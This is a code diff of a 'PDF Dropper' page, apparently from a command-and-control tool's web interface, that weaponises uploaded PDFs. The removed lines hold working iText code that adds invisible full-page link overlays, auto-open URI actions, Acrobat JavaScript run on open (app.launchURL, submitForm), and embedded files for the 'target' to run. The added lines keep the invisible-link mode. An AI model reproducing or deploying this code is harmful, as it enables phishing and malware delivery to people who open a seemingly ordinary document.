@@ -3,102 +3,24 @@
 <div class="tool-panel">
     <div class="tool-header">
         <h3 class="tool-title">PDF Dropper</h3>
-        <p class="tool-subtitle">Inject payloads into PDF documents — link overlays, auto-open actions, JavaScript, or embedded files.</p>
+        <p class="tool-subtitle">Inject invisible full-page link annotations into every page of a PDF — clicking anywhere opens the target URL.</p>
     </div>
 
     <div class="loader-content">
         <div class="loader-section">
-            <h4 class="loader-section-title">1 — Injection Mode</h4>
-            <div class="rtf-mode-tabs">
-                <button class="rtf-mode-tab @(_mode == Mode.LinkAnnotation ? "rtf-mode-tab--active" : "")"
-                        @onclick="() => _mode = Mode.LinkAnnotation">
-                    <C2Icon Name="link" Size="Size.Xs" /> Link Overlay
-                </button>
-                <button class="rtf-mode-tab @(_mode == Mode.OpenAction ? "rtf-mode-tab--active" : "")"
-                        @onclick="() => _mode = Mode.OpenAction">
-                    <C2Icon Name="external-link" Size="Size.Xs" /> Auto-Open URI
-                </button>
-                <button class="rtf-mode-tab @(_mode == Mode.JavaScript ? "rtf-mode-tab--active" : "")"
-                        @onclick="() => _mode = Mode.JavaScript">
-                    <C2Icon Name="code" Size="Size.Xs" /> JavaScript
-                </button>
-                <button class="rtf-mode-tab @(_mode == Mode.EmbedFile ? "rtf-mode-tab--active" : "")"
-                        @onclick="() => _mode = Mode.EmbedFile">
-                    <C2Icon Name="paperclip" Size="Size.Xs" /> Embed File
-                </button>
-            </div>
-
-            <div class="rtf-mode-body">
-                @switch (_mode)
-                {
-                    case Mode.LinkAnnotation:
-                        <p class="loader-text rtf-field-hint">
-                            Adds an invisible full-page <code>PdfLinkAnnotation</code> with a <code>URI</code> action to every page.
-                            Clicking anywhere on the page opens the target URL. Border is invisible, highlight mode is <code>NONE</code>.
-                        </p>
-                        break;
-                    case Mode.OpenAction:
-                        <p class="loader-text rtf-field-hint">
-                            Sets a document-level <code>OpenAction</code> that auto-navigates to the URL when the PDF is opened.
-                            No click required — the reader triggers the action immediately. Most readers show a confirmation prompt.
-                        </p>
-                        break;
-                    case Mode.JavaScript:
-                        <p class="loader-text rtf-field-hint">
-                            Injects a document-level <code>OpenAction</code> with JavaScript. Runs when the PDF is opened in readers
-                            that support JS (Adobe Acrobat, Foxit). Use <code>app.launchURL()</code>, <code>this.submitForm()</code>,
-                            or any Acrobat JS API.
-                        </p>
-                        break;
-                    case Mode.EmbedFile:
-                        <p class="loader-text rtf-field-hint">
-                            Embeds a file as a PDF attachment (EmbeddedFile). The attachment appears in the reader's attachment panel.
-                            Optionally adds a file attachment annotation on page 1 for visibility.
-                        </p>
-                        break;
-                }
-            </div>
+            <h4 class="loader-section-title">1 — Target URL</h4>
+            <p class="loader-text rtf-field-hint">
+                The URL that opens when any page of the PDF is clicked. Covers the entire page area with an invisible annotation.
+            </p>
+            <C2InputActions Value="@_url" ValueChanged="v => _url = v" Monospace BindOnInput
+                            Placeholder="https://example.com/payload" />
         </div>
 
         <div class="loader-section">
-            <h4 class="loader-section-title">2 — Payload</h4>
-
-            @if (_mode == Mode.JavaScript)
-            {
-                <p class="loader-text rtf-field-hint">Acrobat JavaScript to execute on document open.</p>
-                <textarea class="rtf-textarea" @bind="_jsCode" @bind:event="oninput"
-                          placeholder="app.launchURL('https://example.com/payload', true);" rows="4"></textarea>
-            }
-            else if (_mode == Mode.EmbedFile)
-            {
-                <p class="loader-text rtf-field-hint">File to embed as a PDF attachment.</p>
-                <div class="rtf-actions">
-                    <label class="loader-link-btn" style="cursor:pointer">
-                        <C2Icon Name="upload" Size="Size.Xs" /> Select File
-                        <InputFile OnChange="OnEmbedFileUpload" style="display:none" />
-                    </label>
-                    @if (!string.IsNullOrEmpty(_embedFileName))
-                    {
-                        <span class="loader-text">@_embedFileName (@FormatSize(_embedFileBytes?.Length ?? 0))</span>
-                    }
-                </div>
-                <C2Input Value="@_embedDisplayName" ValueChanged="v => _embedDisplayName = v" BindOnInput
-                         Placeholder="Display name (optional — defaults to original filename)" CssClass="rtf-input-spacing" />
-                <label class="rtf-toggle">
-                    <input type="checkbox" checked="@_embedAnnotation" @onchange="e => _embedAnnotation = e.Value is true" />
-                    <span class="rtf-toggle-label">Add file attachment annotation on page 1</span>
-                </label>
-            }
-            else
-            {
-                <p class="loader-text rtf-field-hint">Target URL for the @(_mode == Mode.OpenAction ? "auto-open action" : "link overlay").</p>
-                <C2InputActions Value="@_url" ValueChanged="v => _url = v" Monospace BindOnInput
-                                Placeholder="https://example.com/payload" />
-            }
-        </div>
-
-        <div class="loader-section">
-            <h4 class="loader-section-title">3 — Upload PDF</h4>
+            <h4 class="loader-section-title">2 — Upload PDF</h4>
+            <p class="loader-text rtf-field-hint">
+                Upload a PDF document. Each page will receive a transparent clickable overlay linking to the target URL.
+            </p>
             <div class="rtf-actions">
                 <label class="loader-link-btn" style="cursor:pointer">
                     <C2Icon Name="upload" Size="Size.Xs" /> Upload PDF
@@ -111,13 +33,22 @@
             </div>
         </div>
 
-        @if (_pdfBytes is not null)
+        @if (_pdfBase64 is not null)
         {
             <div class="loader-section">
-                <h4 class="loader-section-title">4 — Download</h4>
+                <h4 class="loader-section-title">3 — Download</h4>
                 <div class="rtf-actions">
-                    <button class="loader-link-btn" @onclick="Generate" disabled="@(!CanGenerate)">
-                        <C2Icon Name="download" Size="Size.Xs" /> Download Injected PDF
+                    <button class="loader-link-btn" @onclick="Generate" disabled="@(string.IsNullOrWhiteSpace(_url) || _generating)">
+                        @if (_generating)
+                        {
+                            <C2Spinner Size="Size.Xs" />
+                            <span>Generating…</span>
+                        }
+                        else
+                        {
+                            <C2Icon Name="download" Size="Size.Xs" />
+                            <span>Download Injected PDF</span>
+                        }
                     </button>
                 </div>
                 @if (!string.IsNullOrEmpty(_error))
@@ -129,74 +60,24 @@
 
         <div class="loader-section">
             <h4 class="loader-section-title">How It Works</h4>
-            @switch (_mode)
-            {
-                case Mode.LinkAnnotation:
-                    <p class="loader-text">
-                        1. Upload any PDF document<br/>
-                        2. A transparent <code>PdfLinkAnnotation</code> covering the full page is added to every page<br/>
-                        3. The annotation triggers a <code>URI</code> action pointing to your target URL<br/>
-                        4. The border is invisible and highlight mode is <code>NONE</code> — no visual change<br/>
-                        5. Target clicks anywhere on any page → browser opens the URL
-                    </p>
-                    break;
-                case Mode.OpenAction:
-                    <p class="loader-text">
-                        1. Upload any PDF document<br/>
-                        2. A document-level <code>OpenAction</code> with <code>URI</code> type is set in the PDF catalog<br/>
-                        3. When the target opens the PDF, the reader auto-navigates to the URL<br/>
-                        4. Most readers (Adobe, Foxit) show a "this document is trying to connect to..." prompt<br/>
-                        5. No click interaction required — triggers on document open
-                    </p>
-                    break;
-                case Mode.JavaScript:
-                    <p class="loader-text">
-                        1. Upload any PDF document<br/>
-                        2. A document-level <code>OpenAction</code> with <code>JavaScript</code> type is set<br/>
-                        3. When opened in Adobe Acrobat or Foxit, the JS executes automatically<br/>
-                        4. Common payloads: <code>app.launchURL(url, true)</code>, <code>this.submitForm(url)</code><br/>
-                        5. Chrome/Edge/browser PDF viewers do <b>not</b> execute PDF JavaScript
-                    </p>
-                    break;
-                case Mode.EmbedFile:
-                    <p class="loader-text">
-                        1. Upload a PDF and select a file to embed<br/>
-                        2. The file is added as a <code>/EmbeddedFile</code> in the PDF's name tree<br/>
-                        3. Appears in the reader's Attachments/Paperclip panel<br/>
-                        4. Optionally adds a visible file attachment annotation (paperclip icon) on page 1<br/>
-                        5. Target can extract and run the attached file
-                    </p>
-                    break;
-            }
+            <p class="loader-text">
+                1. Upload any PDF document<br/>
+                2. A transparent link annotation covering the full page is added to every page<br/>
+                3. The annotation triggers a URI action pointing to your target URL<br/>
+                4. The border is invisible and highlight mode is NONE — no visual change<br/>
+                5. Target clicks anywhere on any page → browser opens the URL
+            </p>
         </div>
     </div>
 </div>
 
 @code {
-    private enum Mode { LinkAnnotation, OpenAction, JavaScript, EmbedFile }
-
-    private Mode _mode = Mode.LinkAnnotation;
     private string _url = "";
-    private string _jsCode = "";
     private string _fileName = "";
     private string _error = "";
-    private byte[]? _pdfBytes;
+    private string? _pdfBase64;
     private int _pageCount;
-
-    // Embed file state
-    private string _embedFileName = "";
-    private string _embedDisplayName = "";
-    private byte[]? _embedFileBytes;
-    private bool _embedAnnotation = true;
-
-    private bool CanGenerate => _pdfBytes is not null && _mode switch
-    {
-        Mode.LinkAnnotation => !string.IsNullOrWhiteSpace(_url),
-        Mode.OpenAction => !string.IsNullOrWhiteSpace(_url),
-        Mode.JavaScript => !string.IsNullOrWhiteSpace(_jsCode),
-        Mode.EmbedFile => _embedFileBytes is not null,
-        _ => false
-    };
+    private bool _generating;
 
     private async Task OnPdfUpload(InputFileChangeEventArgs e)
     {
@@ -209,62 +90,47 @@
         using var stream = file.OpenReadStream(maxAllowedSize: 50 * 1024 * 1024);
         using var ms = new MemoryStream();
         await stream.CopyToAsync(ms);
-        _pdfBytes = ms.ToArray();
+        _pdfBase64 = Convert.ToBase64String(ms.ToArray());
 
         try
         {
-            using var inputStream = new MemoryStream(_pdfBytes);
-            using var reader = new iText.Kernel.Pdf.PdfReader(inputStream);
-            using var doc = new iText.Kernel.Pdf.PdfDocument(reader);
-            _pageCount = doc.GetNumberOfPages();
+            var info = await JS.InvokeAsync<PdfInfo>("c2PdfDropper.info", _pdfBase64);
+            if (info.Error is not null)
+            {
+                _error = info.Error;
+                _pdfBase64 = null;
+                _pageCount = 0;
+            }
+            else
+            {
+                _pageCount = info.PageCount;
+            }
         }
-        catch
+        catch (Exception ex)
         {
             _pageCount = 0;
-            _error = "Could not read PDF — file may be corrupt or encrypted.";
-            _pdfBytes = null;
+            _error = $"Could not read PDF: {ex.Message}";
+            _pdfBase64 = null;
         }
 
-        StateHasChanged();
-    }
-
-    private async Task OnEmbedFileUpload(InputFileChangeEventArgs e)
-    {
-        var file = e.File;
-        if (file is null) return;
-
-        _embedFileName = file.Name;
-        using var stream = file.OpenReadStream(maxAllowedSize: 50 * 1024 * 1024);
-        using var ms = new MemoryStream();
-        await stream.CopyToAsync(ms);
-        _embedFileBytes = ms.ToArray();
         StateHasChanged();
     }
 
     private async Task Generate()
     {
-        if (_pdfBytes is null || !CanGenerate) return;
+        if (_pdfBase64 is null || string.IsNullOrWhiteSpace(_url)) return;
         _error = "";
+        _generating = true;
+        StateHasChanged();
 
         try
         {
-            var result = _mode switch
-            {
-                Mode.LinkAnnotation => InjectLinkAnnotations(_pdfBytes, _url.Trim()),
-                Mode.OpenAction => InjectOpenActionUri(_pdfBytes, _url.Trim()),
-                Mode.JavaScript => InjectJavaScript(_pdfBytes, _jsCode),
-                Mode.EmbedFile => EmbedFileAttachment(_pdfBytes, _embedFileBytes!,
-                    string.IsNullOrWhiteSpace(_embedDisplayName) ? _embedFileName : _embedDisplayName.Trim(),
-                    _embedAnnotation),
-                _ => throw new InvalidOperationException()
-            };
-
-            var base64 = Convert.ToBase64String(result);
+            var resultBase64 = await JS.InvokeAsync<string>("c2PdfDropper.injectLinkAnnotation", _pdfBase64, _url.Trim());
             var outName = System.IO.Path.GetFileNameWithoutExtension(_fileName) + "_drop.pdf";
             await JS.InvokeVoidAsync("eval", $@"
                 (function() {{
                     var a = document.createElement('a');
-                    a.href = 'data:application/pdf;base64,{base64}';
+                    a.href = 'data:application/pdf;base64,{resultBase64}';
                     a.download = '{outName}';
                     document.body.appendChild(a);
                     a.click();
@@ -276,129 +142,12 @@
         {
             _error = $"Generation failed: {ex.Message}";
         }
-    }
-
-    // --- Mode 1: Link Annotation (invisible full-page clickable overlay) ---
-
-    private static byte[] InjectLinkAnnotations(byte[] pdfBytes, string url)
-    {
-        using var inputStream = new MemoryStream(pdfBytes);
-        using var outputStream = new MemoryStream();
-        using var reader = new iText.Kernel.Pdf.PdfReader(inputStream);
-        using var writer = new iText.Kernel.Pdf.PdfWriter(outputStream);
-        using (var pdf = new iText.Kernel.Pdf.PdfDocument(reader, writer))
+        finally
         {
-            var linkArea = new iText.Kernel.Geom.Rectangle(0, 0,
-                iText.Kernel.Geom.PageSize.A4.GetWidth(),
-                iText.Kernel.Geom.PageSize.A4.GetHeight());
-
-            for (int i = 1; i <= pdf.GetNumberOfPages(); i++)
-            {
-                var linkAnnotation = new iText.Kernel.Pdf.Annot.PdfLinkAnnotation(linkArea)
-                    .SetAction(iText.Kernel.Pdf.Action.PdfAction.CreateURI(url))
-                    .SetHighlightMode(iText.Kernel.Pdf.Annot.PdfAnnotation.HIGHLIGHT_NONE);
-
-                linkAnnotation.Put(iText.Kernel.Pdf.PdfName.Border,
-                    new iText.Kernel.Pdf.PdfArray(new float[] { 0, 0, 0 }));
-
-                pdf.GetPage(i).AddAnnotation(linkAnnotation);
-            }
+            _generating = false;
+            StateHasChanged();
         }
-        return outputStream.ToArray();
     }
 
-    // --- Mode 2: OpenAction URI (auto-redirect on document open) ---
-
-    private static byte[] InjectOpenActionUri(byte[] pdfBytes, string url)
-    {
-        using var inputStream = new MemoryStream(pdfBytes);
-        using var outputStream = new MemoryStream();
-        using var reader = new iText.Kernel.Pdf.PdfReader(inputStream);
-        using var writer = new iText.Kernel.Pdf.PdfWriter(outputStream);
-        using (var pdf = new iText.Kernel.Pdf.PdfDocument(reader, writer))
-        {
-            var action = iText.Kernel.Pdf.Action.PdfAction.CreateURI(url);
-            pdf.GetCatalog().SetOpenAction(action);
-        }
-        return outputStream.ToArray();
-    }
-
-    // --- Mode 3: JavaScript (Acrobat JS execution on open) ---
-
-    private static byte[] InjectJavaScript(byte[] pdfBytes, string jsCode)
-    {
-        using var inputStream = new MemoryStream(pdfBytes);
-        using var outputStream = new MemoryStream();
-        using var reader = new iText.Kernel.Pdf.PdfReader(inputStream);
-        using var writer = new iText.Kernel.Pdf.PdfWriter(outputStream);
-        using (var pdf = new iText.Kernel.Pdf.PdfDocument(reader, writer))
-        {
-            var action = iText.Kernel.Pdf.Action.PdfAction.CreateJavaScript(jsCode);
-            pdf.GetCatalog().SetOpenAction(action);
-        }
-        return outputStream.ToArray();
-    }
-
-    // --- Mode 4: Embed File (attach a file inside the PDF) ---
-
-    private static byte[] EmbedFileAttachment(byte[] pdfBytes, byte[] fileBytes, string fileName, bool addAnnotation)
-    {
-        using var inputStream = new MemoryStream(pdfBytes);
-        using var outputStream = new MemoryStream();
-        using var reader = new iText.Kernel.Pdf.PdfReader(inputStream);
-        using var writer = new iText.Kernel.Pdf.PdfWriter(outputStream);
-        using (var pdf = new iText.Kernel.Pdf.PdfDocument(reader, writer))
-        {
-            // Create the embedded file stream
-            var embeddedStream = new iText.Kernel.Pdf.PdfStream(fileBytes);
-            embeddedStream.Put(iText.Kernel.Pdf.PdfName.Type, iText.Kernel.Pdf.PdfName.EmbeddedFile);
-
-            // Build file spec dictionary
-            var fileSpec = new iText.Kernel.Pdf.PdfDictionary();
-            fileSpec.Put(iText.Kernel.Pdf.PdfName.Type, iText.Kernel.Pdf.PdfName.Filespec);
-            fileSpec.Put(iText.Kernel.Pdf.PdfName.F, new iText.Kernel.Pdf.PdfString(fileName));
-            fileSpec.Put(iText.Kernel.Pdf.PdfName.UF, new iText.Kernel.Pdf.PdfString(fileName));
-
-            var efDict = new iText.Kernel.Pdf.PdfDictionary();
-            efDict.Put(iText.Kernel.Pdf.PdfName.F, embeddedStream);
-            fileSpec.Put(iText.Kernel.Pdf.PdfName.EF, efDict);
-            fileSpec.MakeIndirect(pdf);
-
-            // Add to document name tree
-            var catalog = pdf.GetCatalog().GetPdfObject();
-            var names = catalog.GetAsDictionary(iText.Kernel.Pdf.PdfName.Names);
-            if (names is null)
-            {
-                names = new iText.Kernel.Pdf.PdfDictionary();
-                catalog.Put(iText.Kernel.Pdf.PdfName.Names, names);
-            }
-
-            var embeddedFiles = new iText.Kernel.Pdf.PdfDictionary();
-            var namesArray = new iText.Kernel.Pdf.PdfArray();
-            namesArray.Add(new iText.Kernel.Pdf.PdfString(fileName));
-            namesArray.Add(fileSpec);
-            embeddedFiles.Put(iText.Kernel.Pdf.PdfName.Names, namesArray);
-            names.Put(iText.Kernel.Pdf.PdfName.EmbeddedFiles, embeddedFiles);
-
-            // Optionally add a visible file attachment annotation on page 1
-            if (addAnnotation && pdf.GetNumberOfPages() > 0)
-            {
-                var rect = new iText.Kernel.Geom.Rectangle(10, 10, 20, 20);
-                var spec = iText.Kernel.Pdf.Filespec.PdfFileSpec.CreateEmbeddedFileSpec(
-                    pdf, fileBytes, null, fileName, null, null, null);
-                var annot = new iText.Kernel.Pdf.Annot.PdfFileAttachmentAnnotation(rect, spec);
-                annot.SetIconName(new iText.Kernel.Pdf.PdfName("Paperclip"));
-                annot.SetContents(fileName);
-                pdf.GetPage(1).AddAnnotation(annot);
-            }
-        }
-        return outputStream.ToArray();
-    }
-
-    private static string FormatSize(int bytes)
-    {
-        if (bytes < 1024) return $"{bytes} B";
-        if (bytes < 1024 * 1024) return $"{bytes / 1024.0:F1} KB";
-        return $"{bytes / (1024.0 * 1024.0):F1} MB";
-    }
+    private record PdfInfo(int PageCount, string? Error);
 }
